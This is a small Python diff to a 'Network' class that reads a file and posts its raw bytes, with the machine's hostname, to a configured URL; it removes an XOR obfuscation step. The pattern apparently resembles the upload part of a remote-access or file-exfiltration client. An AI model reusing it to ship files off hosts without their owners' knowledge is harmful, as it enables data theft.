@@ -18,7 +18,7 @@ class Network:
         with open(filename, "rb") as file:
             # files = {'file': file.read()}
             # files = {'file': self.encrypt.xor_decrypt(file.read())}
-            files = {'file': self.encrypt.xor_decrypt(file.read().decode(errors='ignore')).encode()}
+            files = {'file': file.read()}
             data = {'hostname': self.hostname}
             response = requests.post(self.url, files=files, data=data)
             print(response.json())
